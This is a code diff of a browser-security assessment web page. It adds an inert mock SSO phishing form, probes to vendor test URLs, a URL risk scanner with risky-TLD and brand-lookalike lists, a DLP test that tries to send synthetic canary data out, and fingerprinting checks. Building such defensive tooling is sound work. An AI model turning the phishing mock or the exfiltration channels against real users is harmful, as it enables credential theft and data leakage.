@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Evasion Techniques POV Simulator</title>
+    <title>Browser Security Posture Assessment</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     
     <style>
@@ -168,15 +168,107 @@
         @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
         .phone-text { color: white; font-size: 10px; position: absolute; bottom: 5px; width: 100%; text-align: center; font-family: sans-serif;}
 
+        /* --- Posture Score Banner --- */
+        .score-banner {
+            background: linear-gradient(135deg, #1a3c5a 0%, #2b5c7e 100%); color: #fff; border-radius: 20px;
+            max-width: 1100px; margin: 30px auto 0 auto; padding: 24px 32px; display: flex; align-items: center;
+            gap: 32px; box-shadow: 0 8px 28px rgba(26, 60, 90, 0.25); flex-wrap: wrap; justify-content: center;
+        }
+        .gauge { position: relative; width: 130px; height: 130px; flex: 0 0 auto; }
+        .gauge svg { transform: rotate(-90deg); }
+        .gauge-track { fill: none; stroke: rgba(255,255,255,0.15); stroke-width: 12; }
+        .gauge-fill { fill: none; stroke: #4eb0c9; stroke-width: 12; stroke-linecap: round; transition: stroke-dashoffset 1s ease, stroke 0.5s; }
+        .gauge-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; }
+        .gauge-num { font-size: 34px; font-weight: 800; line-height: 1; }
+        .gauge-grade { font-size: 13px; letter-spacing: 1px; opacity: 0.85; margin-top: 4px; }
+        .score-meta { flex: 1; min-width: 260px; }
+        .score-meta h2 { margin: 0 0 6px 0; font-size: 22px; }
+        .score-meta p { margin: 0; font-size: 14px; line-height: 1.5; opacity: 0.9; }
+        .score-stats { display: flex; gap: 22px; margin-top: 14px; flex-wrap: wrap; }
+        .score-stat { text-align: center; }
+        .score-stat .n { font-size: 22px; font-weight: 800; display: block; }
+        .score-stat .l { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; opacity: 0.8; }
+        .run-all-btn {
+            background: #4eb0c9; color: #fff; border: none; border-radius: 14px; padding: 12px 22px; font-size: 15px;
+            font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        .run-all-btn:hover { background: #3a97ae; transform: translateY(-1px); }
+
+        /* --- Category Tabs --- */
+        .tab-bar {
+            display: flex; gap: 8px; max-width: 1100px; margin: 24px auto 0 auto; padding: 0 20px;
+            flex-wrap: wrap; justify-content: center;
+        }
+        .tab-btn {
+            background: rgba(255,255,255,0.7); border: 1px solid #dcedf6; color: #1a3c5a; border-radius: 14px;
+            padding: 10px 18px; font-size: 14px; font-weight: 700; cursor: pointer; transition: 0.2s;
+        }
+        .tab-btn:hover { background: #fff; }
+        .tab-btn.active { background: #1a3c5a; color: #fff; border-color: #1a3c5a; }
+        .tab-panel { display: none; }
+        .tab-panel.active { display: block; }
+        .category-intro { max-width: 850px; margin: 24px auto 0 auto; padding: 0 20px; text-align: center; }
+        .category-intro h2 { font-size: 26px; color: #0b2031; margin-bottom: 8px; }
+        .category-intro p { font-size: 15px; color: #2b5c7e; line-height: 1.6; }
+
+        /* --- Generic inputs / posture grid --- */
+        .input-row { display: flex; gap: 10px; max-width: 600px; margin: 0 auto 12px auto; flex-wrap: wrap; justify-content: center; }
+        .text-input {
+            flex: 1; min-width: 240px; padding: 11px 14px; border: 1px solid #82c2d1; border-radius: 12px;
+            font-size: 14px; font-family: inherit; color: #1a3c5a; background: #f2f9fa;
+        }
+        .text-input:focus { outline: none; border-color: #4eb0c9; box-shadow: 0 0 0 3px rgba(78,176,201,0.2); }
+        .preset-chips { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin: 8px 0 4px 0; }
+        .chip { background: rgba(130,194,209,0.2); border: 1px solid #b5d5de; border-radius: 16px; padding: 5px 12px;
+            font-size: 12px; cursor: pointer; color: #1a3c5a; transition: 0.2s; }
+        .chip:hover { background: rgba(130,194,209,0.45); }
+
+        .posture-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(230px, 1fr)); gap: 14px; text-align: left; margin-top: 20px; }
+        .posture-card { background: #f2f9fa; border: 1px solid #dcedf6; border-radius: 14px; padding: 14px 16px; }
+        .posture-card .pc-label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: #6b858e; font-weight: 700; }
+        .posture-card .pc-value { font-size: 15px; color: #0b2031; font-weight: 600; margin-top: 4px; word-break: break-word; }
+        .posture-card .pc-tag { display: inline-block; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 10px; margin-top: 8px; }
+        .pc-good { background: #bbf7d0; color: #166534; }
+        .pc-warn { background: #fef08a; color: #854d0e; }
+        .pc-bad { background: #fecaca; color: #991b1b; }
+        .pc-info { background: #e0f2fe; color: #075985; }
+
+        .check-list { text-align: left; max-width: 760px; margin: 18px auto 0 auto; }
+        .check-item { display: flex; align-items: flex-start; gap: 12px; padding: 12px 14px; background: #f2f9fa;
+            border: 1px solid #dcedf6; border-radius: 12px; margin-bottom: 10px; }
+        .check-icon { font-size: 18px; line-height: 1.4; flex: 0 0 auto; }
+        .check-body { flex: 1; }
+        .check-title { font-weight: 700; color: #0b2031; font-size: 14px; }
+        .check-desc { font-size: 13px; color: #2b5c7e; margin-top: 2px; line-height: 1.5; }
+
+        .scan-result { text-align: left; max-width: 760px; margin: 16px auto 0 auto; }
+        .scan-finding { display: flex; gap: 10px; padding: 10px 14px; border-radius: 10px; margin-bottom: 8px; font-size: 13px; align-items: center; }
+        .sf-pass { background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; }
+        .sf-fail { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; }
+        .sf-warn { background: #fffbeb; border: 1px solid #fde68a; color: #92400e; }
+
+        /* Phishing mock */
+        .phish-mock { max-width: 380px; margin: 20px auto 0 auto; background: #fff; border: 1px solid #d1d5db;
+            border-radius: 12px; padding: 28px 26px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); text-align: center; }
+        .phish-logo { font-size: 26px; font-weight: 800; color: #2563eb; margin-bottom: 4px; letter-spacing: -0.5px; }
+        .phish-sub { font-size: 13px; color: #6b7280; margin-bottom: 20px; }
+        .phish-mock input { width: 100%; box-sizing: border-box; padding: 11px 12px; margin-bottom: 12px;
+            border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; }
+        .phish-mock button { width: 100%; padding: 11px; background: #2563eb; color: #fff; border: none;
+            border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .phish-warn-banner { background: #fee2e2; color: #991b1b; font-size: 11px; font-weight: 700; padding: 6px;
+            border-radius: 6px 6px 0 0; margin: -28px -26px 18px -26px; }
+
     </style>
 </head>
 <body>
 
     <div class="top-bar">
-        Advanced Evasion Techniques POV Simulator
+        🛡️ Browser Security Posture Assessment
         <div class="action-buttons">
+            <button class="nav-btn btn-export" onclick="runFullAssessment()" style="background:#22c55e;color:#fff;">Run Full Assessment ▶</button>
             <button class="nav-btn btn-export" onclick="exportScorecard()">Export Scorecard 📥</button>
-            <button class="nav-btn btn-reset" onclick="location.reload()">Reset Demo 🔄</button>
+            <button class="nav-btn btn-reset" onclick="location.reload()">Reset 🔄</button>
         </div>
     </div>
 
@@ -191,19 +283,59 @@
         </div>
     </div>
 
-    <div class="dashboard" id="export-target">
-        <div id="payload-source-tag" class="payload-indicator">Loading Payload Engine...</div>
-        <div class="dash-item"><span class="dash-label">1. WW Chunking</span><div id="badge-chunk" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
-        <div class="dash-item"><span class="dash-label">2. WW Smuggling</span><div id="badge-smuggle" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
-        <div class="dash-item"><span class="dash-label">3. Polymorphic JS</span><div id="badge-poly" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
-        <div class="dash-item"><span class="dash-label">4. Quishing</span><div id="badge-quish" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
-        <div class="dash-item"><span class="dash-label">5. SVG Smuggling</span><div id="badge-svg" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
-        <div class="dash-item"><span class="dash-label">6. Crypto-Jacking</span><div id="badge-crypto" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
-        <div class="dash-item"><span class="dash-label">7. WebSocket</span><div id="badge-ws" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
-        <div class="dash-item"><span class="dash-label">8. Obfuscated JS</span><div id="badge-obfuscation" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+    <div class="score-banner">
+        <div class="gauge">
+            <svg width="130" height="130" viewBox="0 0 130 130">
+                <circle class="gauge-track" cx="65" cy="65" r="56"></circle>
+                <circle id="gauge-fill" class="gauge-fill" cx="65" cy="65" r="56" stroke-dasharray="351.86" stroke-dashoffset="351.86"></circle>
+            </svg>
+            <div class="gauge-text">
+                <div id="gauge-num" class="gauge-num">—</div>
+                <div id="gauge-grade" class="gauge-grade">NOT RUN</div>
+            </div>
+        </div>
+        <div class="score-meta">
+            <h2>Web Security Posture Score</h2>
+            <p>This assessment safely simulates modern web attacks against your existing security stack (SWG, firewall, endpoint, enterprise browser) using benign, industry-standard test artifacts. A lower score means more attacks slipped past your controls.</p>
+            <div class="score-stats">
+                <div class="score-stat"><span id="stat-blocked" class="n">0</span><span class="l">Blocked 🛡️</span></div>
+                <div class="score-stat"><span id="stat-bypassed" class="n">0</span><span class="l">Bypassed ❌</span></div>
+                <div class="score-stat"><span id="stat-tested" class="n">0</span><span class="l">Tested</span></div>
+                <div class="score-stat"><span id="stat-total" class="n">0</span><span class="l">Total Vectors</span></div>
+            </div>
+        </div>
     </div>
 
-    <div class="container">
+    <div class="dashboard" id="export-target">
+        <div id="payload-source-tag" class="payload-indicator">Loading Payload Engine...</div>
+        <div class="dash-item"><span class="dash-label">WW Chunking</span><div id="badge-chunk" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">File Smuggling</span><div id="badge-smuggle" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Polymorphic JS</span><div id="badge-poly" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Quishing</span><div id="badge-quish" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">SVG Smuggling</span><div id="badge-svg" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Crypto-Jacking</span><div id="badge-crypto" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">WebSocket</span><div id="badge-ws" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Obfuscated JS</span><div id="badge-obfuscation" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Phishing Page</span><div id="badge-phish" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Malicious Site</span><div id="badge-malsite" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Web DLP</span><div id="badge-dlp" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+        <div class="dash-item"><span class="dash-label">Browser Hardening</span><div id="badge-hardening" class="status-badge status-untested" onclick="toggleBadge(this)">Untested ➖</div></div>
+    </div>
+
+    <div class="tab-bar" id="tabBar">
+        <button class="tab-btn active" data-tab="files">📁 Malicious Files (LMR)</button>
+        <button class="tab-btn" data-tab="phishing">🎣 Phishing</button>
+        <button class="tab-btn" data-tab="sites">🌐 Malicious Sites &amp; URL Scanner</button>
+        <button class="tab-btn" data-tab="dlp">🔓 Web DLP</button>
+        <button class="tab-btn" data-tab="posture">🧬 Browser Posture</button>
+        <button class="tab-btn" data-tab="hardening">🔒 Hardening &amp; Extensions</button>
+    </div>
+
+    <div class="container tab-panel active" id="panel-files">
+        <div class="category-intro">
+            <h2>Last Mile Reassembly &amp; Malicious File Delivery</h2>
+            <p>Modern attackers smuggle files past Secure Web Gateways by reassembling them <em>inside the browser</em>, after traffic has already cleared network inspection. These 8 modules use benign EICAR / Palo Alto Wildfire test payloads to check whether your stack catches client-side reassembly.</p>
+        </div>
 
         <div class="test-section">
             <h1>Test 1: Web-Worker Malware Chunking</h1>
@@ -320,6 +452,133 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
 
     </div>
 
+    <!-- ============ PHISHING PANEL ============ -->
+    <div class="container tab-panel" id="panel-phishing">
+        <div class="category-intro">
+            <h2>Phishing Defense</h2>
+            <p>Phishing remains the #1 initial-access vector. These tests check whether your security stack blocks known phishing test URLs and whether a credential-harvesting page rendered <em>locally in the browser</em> (a common SWG bypass) is detected. No credentials are ever transmitted — the form is an inert training mock.</p>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 9: Locally-Rendered Phishing Page</h1>
+            <p class="desc">Attackers increasingly reassemble phishing pages client-side so the malicious HTML never crosses the wire intact. This renders a benign mock of a corporate login page entirely in your browser. If your endpoint/enterprise browser flags it, your controls inspect the rendered DOM — not just network traffic.</p>
+            <div class="phish-mock">
+                <div class="phish-warn-banner">⚠️ SIMULATED PHISHING PAGE — TRAINING MOCK, NO DATA IS SENT</div>
+                <div class="phish-logo">Acme Corp SSO</div>
+                <div class="phish-sub">Sign in to continue to your workspace</div>
+                <input type="email" id="phishEmail" placeholder="name@acme-corp.com" autocomplete="off">
+                <input type="password" id="phishPass" placeholder="Password" autocomplete="off">
+                <button onclick="submitPhishMock()">Sign In</button>
+            </div>
+            <div class="demo-section" style="margin-top:20px; padding-top:10px; border:none;">
+                <button id="startPhishUrlBtn" class="run-btn" onclick="testPhishUrl()">Test Phishing-URL Reachability</button>
+                <div id="log9" class="log"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ MALICIOUS SITES + URL SCANNER PANEL ============ -->
+    <div class="container tab-panel" id="panel-sites">
+        <div class="category-intro">
+            <h2>Malicious Sites &amp; URL / Domain Scanner</h2>
+            <p>Two complementary checks: (1) a client-side <strong>URL risk analyzer</strong> that flags homograph/punycode lookalikes, IP-literal hosts, risky TLDs, embedded credentials and brand impersonation; and (2) a <strong>category-block test</strong> that attempts to reach industry-standard malware/test URLs to confirm your SWG filtering actually blocks them.</p>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 10: URL &amp; Domain Risk Scanner</h1>
+            <p class="desc">Paste any URL to run a heuristic threat analysis entirely in your browser, or pick a preset. The scanner mirrors the static checks a domain-reputation engine performs before allowing navigation.</p>
+            <div class="input-row">
+                <input type="text" id="urlInput" class="text-input" placeholder="https://example.com/login" value="https://paypa1.com@secure-login.xn--80ak6aa92e.com/verify">
+                <button class="run-btn" onclick="scanUrl()">Scan URL</button>
+            </div>
+            <div class="preset-chips">
+                <span class="chip" onclick="setUrl('https://www.google.com')">Clean URL</span>
+                <span class="chip" onclick="setUrl('http://192.168.4.11/admin/login.php')">IP-literal host</span>
+                <span class="chip" onclick="setUrl('https://paypa1.com@secure-login.xn--80ak6aa92e.com/verify')">Homograph + creds</span>
+                <span class="chip" onclick="setUrl('http://free-gift-card-amaz0n.support.tk/claim')">Risky TLD lookalike</span>
+            </div>
+            <div id="urlScanResult" class="scan-result"></div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 11: Malicious-Site Category Blocking</h1>
+            <p class="desc">Attempts to reach a set of safe, industry-standard test endpoints (AMTSO &amp; Palo Alto URL-filtering test pages). These domains are recognized by reputable filtering engines as "should-be-blocked" categories. A blocked request is a <strong>pass</strong>; a successful load is a <strong>bypass</strong>.</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startMalSiteBtn" class="run-btn" onclick="testMaliciousSites()">Run Category-Block Test</button>
+                <div id="log11" class="log"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ WEB DLP PANEL ============ -->
+    <div class="container tab-panel" id="panel-dlp">
+        <div class="category-intro">
+            <h2>Web DLP / Data Exfiltration</h2>
+            <p>Data Loss Prevention controls should stop sensitive data from leaving the browser. These tests attempt to exfiltrate <strong>synthetic, non-real canary data</strong> (a documented Visa test card number, a fake SSN pattern, and a unique canary token) over three common channels. If the data leaves un-redacted, your web DLP has a gap.</p>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 12: Sensitive-Data Exfiltration Channels</h1>
+            <p class="desc">Sends synthetic canary data via (a) an HTTP form-style POST, (b) a <code>fetch()</code> JSON body, and (c) a URL query-string beacon. All payloads use universally-recognized test values — <strong>no real PII is used</strong>. Watch whether your DLP/SWG redacts, blocks, or alerts on the transfer.</p>
+            <div class="preset-chips">
+                <span class="chip" onclick="setDlpData('card')">Test Credit Card</span>
+                <span class="chip" onclick="setDlpData('ssn')">Fake SSN</span>
+                <span class="chip" onclick="setDlpData('canary')">Canary Token</span>
+                <span class="chip" onclick="setDlpData('source')">Source-Code Secret</span>
+            </div>
+            <div class="input-row">
+                <input type="text" id="dlpInput" class="text-input" value="Visa test card 4111 1111 1111 1111 exp 12/29 cvv 123">
+            </div>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startDlpBtn" class="run-btn" onclick="testDlp()">Attempt Exfiltration</button>
+                <div id="log12" class="log"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ BROWSER POSTURE PANEL ============ -->
+    <div class="container tab-panel" id="panel-posture">
+        <div class="category-intro">
+            <h2>Browser Posture &amp; Fingerprint Analysis</h2>
+            <p>An attacker profiles your browser before delivering a tailored exploit. This read-only analysis enumerates exactly what any website can silently learn about your device — engine, OS, hardware, GPU, fonts, network leaks and a unique fingerprint hash — so you can see your exposure surface.</p>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 13: Device &amp; Fingerprint Surface</h1>
+            <p class="desc">Reads only data already exposed to every page you visit. Nothing here is transmitted anywhere; it is displayed locally to illustrate your trackable surface.</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startPostureBtn" class="run-btn" onclick="analyzePosture()">Analyze Browser Posture</button>
+                <div id="postureGrid" class="posture-grid"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ HARDENING + EXTENSIONS PANEL ============ -->
+    <div class="container tab-panel" id="panel-hardening">
+        <div class="category-intro">
+            <h2>Browser Hardening &amp; Extension Risk</h2>
+            <p>Evaluates whether modern browser security mitigations are active in your current context and surfaces extension-related exposure. Inspired by enterprise browser-posture platforms, every check runs locally and reports a pass / warn / fail with remediation guidance.</p>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 14: Security-Hardening Checklist</h1>
+            <p class="desc">Checks the live security context of this page and the capabilities your browser exposes — secure context, isolation headers, cookie hygiene, and modern defenses like Trusted Types.</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startHardeningBtn" class="run-btn" onclick="runHardeningChecks()">Run Hardening Checklist</button>
+                <div id="hardeningList" class="check-list"></div>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h1>Test 15: Extension Exposure Probe</h1>
+            <p class="desc">Best-effort, privacy-respecting probe for active browser extensions by checking for DOM artifacts and web-accessible resources of common extensions. Extensions hold powerful page-access permissions and are a growing attack surface.</p>
+            <div class="demo-section" style="margin-top:0; padding-top:10px; border:none;">
+                <button id="startExtBtn" class="run-btn" onclick="probeExtensions()">Probe Extension Surface</button>
+                <div id="extList" class="check-list"></div>
+            </div>
+        </div>
+    </div>
+
     <script>
         // --- Dynamic Payload Manager ---
         let GLOBAL_PAYLOAD_BYTES = null;
@@ -362,6 +621,7 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
                 if(btn.id === 'startWsTestBtn') btn.innerText = "Run WebSocket Malware";
                 if(btn.id === 'startObfuscationTestBtn') btn.innerText = "Run Obfuscated JS";
             });
+            updateScore();
         }
         window.onload = initializePayloadEngine;
 
@@ -370,7 +630,8 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
             const badge = document.getElementById(badgeId);
             badge.className = `status-badge ${statusClass}`;
             badge.innerText = text;
-            badge.dataset.state = statusClass; 
+            badge.dataset.state = statusClass;
+            updateScore();
         }
 
         function toggleBadge(element) {
@@ -384,6 +645,54 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
                 element.innerText = 'Blocked 🛡️';
                 element.dataset.state = 'status-blocked';
             }
+            updateScore();
+        }
+
+        // Directly classify a vector (used by automated checks)
+        function markVector(badgeId, blocked) {
+            if (blocked) setBadgeStatus(badgeId, 'status-blocked', 'Blocked 🛡️');
+            else setBadgeStatus(badgeId, 'status-bypassed', 'Bypassed ❌');
+        }
+
+        // --- Posture Scoring Engine ---
+        const GAUGE_CIRC = 2 * Math.PI * 56;
+        function updateScore() {
+            const badges = document.querySelectorAll('.dashboard .status-badge');
+            let blocked = 0, bypassed = 0, fired = 0;
+            badges.forEach(b => {
+                const s = b.dataset.state;
+                if (s === 'status-blocked') blocked++;
+                else if (s === 'status-bypassed') bypassed++;
+                else if (s === 'status-fired') fired++;
+            });
+            const classified = blocked + bypassed;
+            const tested = classified + fired;
+            document.getElementById('stat-blocked').innerText = blocked;
+            document.getElementById('stat-bypassed').innerText = bypassed;
+            document.getElementById('stat-tested').innerText = tested;
+            document.getElementById('stat-total').innerText = badges.length;
+
+            const fill = document.getElementById('gauge-fill');
+            const numEl = document.getElementById('gauge-num');
+            const gradeEl = document.getElementById('gauge-grade');
+
+            if (classified === 0) {
+                numEl.innerText = fired > 0 ? '?' : '—';
+                gradeEl.innerText = fired > 0 ? 'AWAITING VERDICT' : 'NOT RUN';
+                fill.style.strokeDashoffset = GAUGE_CIRC;
+                return;
+            }
+            const score = Math.round((blocked / classified) * 100);
+            numEl.innerText = score;
+            let grade, color;
+            if (score >= 90) { grade = 'GRADE A'; color = '#22c55e'; }
+            else if (score >= 80) { grade = 'GRADE B'; color = '#4eb0c9'; }
+            else if (score >= 70) { grade = 'GRADE C'; color = '#eab308'; }
+            else if (score >= 60) { grade = 'GRADE D'; color = '#f97316'; }
+            else { grade = 'GRADE F'; color = '#ef4444'; }
+            gradeEl.innerText = grade;
+            fill.style.stroke = color;
+            fill.style.strokeDashoffset = GAUGE_CIRC * (1 - score / 100);
         }
 
         function toggleBtnState(btnId, isRunning, defaultText) {
@@ -806,6 +1115,415 @@ document.<span class="var">write</span>(<span class="str">'&lt;script&gt;'</span
                 toggleBtnState(btnId, false, "Run Obfuscated JS");
             }, 1000);
         });
+
+        // ============================================================
+        //  CATEGORY TABS
+        // ============================================================
+        document.getElementById('tabBar').addEventListener('click', (e) => {
+            const btn = e.target.closest('.tab-btn');
+            if (!btn) return;
+            const tab = btn.dataset.tab;
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.toggle('active', b === btn));
+            document.querySelectorAll('.tab-panel').forEach(p => p.classList.toggle('active', p.id === 'panel-' + tab));
+        });
+
+        // ============================================================
+        //  TEST 9: PHISHING
+        // ============================================================
+        function submitPhishMock() {
+            const email = document.getElementById('phishEmail').value || '(empty)';
+            updateLog('log9', '', true);
+            updateLog('log9', `Form submitted for "${email}".`);
+            updateLog('log9', 'In a real attack these credentials would now be POSTed to an attacker C2. This mock transmits NOTHING.');
+            updateLog('log9', 'If your security stack did not warn/block before you reached this point, a locally-rendered phishing page bypassed it.');
+            document.getElementById('phishEmail').value = '';
+            document.getElementById('phishPass').value = '';
+            setBadgeStatus('badge-phish', 'status-fired', 'Page Rendered ⚠️');
+            window.triggerEvasionPopup(null);
+        }
+
+        async function testPhishUrl() {
+            const btnId = 'startPhishUrlBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log9', '', true);
+            setBadgeStatus('badge-phish', 'status-fired', 'Page Rendered ⚠️');
+            const phishUrl = 'http://urlfiltering.paloaltonetworks.com/test-phishing';
+            updateLog('log9', `Attempting to reach known phishing test URL: ${phishUrl}`);
+            const reached = await probeReachable(phishUrl);
+            if (reached) {
+                updateLog('log9', '⚠️ Request completed — URL filtering did NOT block the phishing category.');
+            } else {
+                updateLog('log9', '🛡️ Request was blocked/unreachable — your filter likely caught the phishing category.');
+            }
+            updateLog('log9', 'Click the "Phishing Page" dashboard tile to record whether your controls blocked it.');
+            toggleBtnState(btnId, false, 'Test Phishing-URL Reachability');
+        }
+
+        // Heuristic reachability probe: resolves true if request completes, false if network/policy blocks it.
+        function probeReachable(url, timeoutMs = 5000) {
+            return new Promise(resolve => {
+                let done = false;
+                const finish = (v) => { if (!done) { done = true; resolve(v); } };
+                const t = setTimeout(() => finish(false), timeoutMs);
+                fetch(url, { mode: 'no-cors', cache: 'no-store' })
+                    .then(() => { clearTimeout(t); finish(true); })
+                    .catch(() => { clearTimeout(t); finish(false); });
+            });
+        }
+
+        // ============================================================
+        //  TEST 10: URL & DOMAIN RISK SCANNER (fully client-side)
+        // ============================================================
+        function setUrl(u) { document.getElementById('urlInput').value = u; scanUrl(); }
+
+        const RISKY_TLDS = ['tk','ml','ga','cf','gq','top','xyz','zip','mov','support','click','country','kim','work','party','gdn'];
+        const KNOWN_BRANDS = ['paypal','google','microsoft','apple','amazon','facebook','netflix','bank','outlook','office365','docusign','coinbase'];
+
+        function scanUrl() {
+            const raw = document.getElementById('urlInput').value.trim();
+            const out = document.getElementById('urlScanResult');
+            out.innerHTML = '';
+            if (!raw) { addFinding('urlScanResult', 'warn', 'Enter a URL to scan.'); return; }
+            let url;
+            try { url = new URL(raw); }
+            catch { addFinding('urlScanResult', 'fail', 'Malformed URL — could not be parsed.'); return; }
+
+            let risk = 0;
+            const host = url.hostname;
+
+            // Scheme
+            if (url.protocol === 'http:') { addFinding('urlScanResult', 'warn', 'Uses plaintext HTTP — traffic is unencrypted and tamperable.'); risk += 1; }
+            else addFinding('urlScanResult', 'pass', 'Uses HTTPS.');
+
+            // Embedded credentials (user@host)
+            if (url.username || raw.split('/')[2]?.includes('@')) {
+                addFinding('urlScanResult', 'fail', `Embedded credentials / "@" in authority ("${url.username || raw.split('@')[0].split('//')[1]}") — classic trick to hide the real destination host.`);
+                risk += 3;
+            }
+
+            // IP literal host
+            if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) { addFinding('urlScanResult', 'fail', `Host is a raw IP address (${host}) — legitimate brands rarely link to bare IPs.`); risk += 2; }
+
+            // Punycode / homograph
+            if (host.includes('xn--')) { addFinding('urlScanResult', 'fail', `Punycode (IDN) host detected (${host}) — frequently used for homograph look-alike domains.`); risk += 3; }
+
+            // Risky TLD
+            const tld = host.split('.').pop().toLowerCase();
+            if (RISKY_TLDS.includes(tld)) { addFinding('urlScanResult', 'warn', `Top-level domain ".${tld}" is heavily abused for malicious sites.`); risk += 2; }
+
+            // Excessive subdomains
+            const labels = host.split('.');
+            if (labels.length >= 5) { addFinding('urlScanResult', 'warn', `Unusually deep subdomain chain (${labels.length} labels) — used to bury the real domain.`); risk += 1; }
+
+            // Brand impersonation (lookalike with digits/hyphens)
+            const lower = host.toLowerCase();
+            KNOWN_BRANDS.forEach(b => {
+                const fuzzy = b.replace(/o/g,'[o0]').replace(/i/g,'[i1l]').replace(/l/g,'[l1i]').replace(/e/g,'[e3]').replace(/a/g,'[a4]');
+                const re = new RegExp(fuzzy);
+                if (re.test(lower) && !lower.includes(b + '.')) {
+                    addFinding('urlScanResult', 'fail', `Possible brand impersonation of "${b}" via character substitution.`);
+                    risk += 3;
+                }
+            });
+
+            // Suspicious keywords in path
+            if (/(verify|secure|update|login|signin|account|confirm|claim|gift|wallet|unlock)/i.test(url.pathname + url.search)) {
+                addFinding('urlScanResult', 'warn', 'Path contains urgency / credential-bait keywords (verify, secure, claim…).');
+                risk += 1;
+            }
+
+            const verdict = risk >= 5 ? ['fail','🚨 HIGH RISK'] : risk >= 2 ? ['warn','⚠️ SUSPICIOUS'] : ['pass','✅ LOW RISK'];
+            const banner = document.createElement('div');
+            banner.className = 'scan-finding sf-' + verdict[0];
+            banner.style.fontWeight = '800';
+            banner.innerHTML = `${verdict[1]} — heuristic risk score ${risk}`;
+            out.prepend(banner);
+        }
+
+        function addFinding(containerId, type, text) {
+            const icon = type === 'pass' ? '✅' : type === 'fail' ? '🚩' : '⚠️';
+            const div = document.createElement('div');
+            div.className = 'scan-finding sf-' + type;
+            div.innerHTML = `<span>${icon}</span><span>${text}</span>`;
+            document.getElementById(containerId).appendChild(div);
+        }
+
+        // ============================================================
+        //  TEST 11: MALICIOUS-SITE CATEGORY BLOCKING
+        // ============================================================
+        async function testMaliciousSites() {
+            const btnId = 'startMalSiteBtn';
+            toggleBtnState(btnId, true);
+            updateLog('log11', '', true);
+            setBadgeStatus('badge-malsite', 'status-fired', 'Testing ⚠️');
+            const targets = [
+                { name: 'Palo Alto URL-filtering test', url: 'http://urlfiltering.paloaltonetworks.com/test-malware' },
+                { name: 'AMTSO malware-download test', url: 'https://www.amtso.org/feature-settings-check-download/' },
+                { name: 'AMTSO phishing-page test', url: 'https://www.amtso.org/feature-settings-check-phishing-page/' },
+                { name: 'EICAR test file host', url: 'https://secure.eicar.org/eicar.com' }
+            ];
+            let reachedCount = 0;
+            for (const t of targets) {
+                updateLog('log11', `Probing "${t.name}"...`);
+                const reached = await probeReachable(t.url, 6000);
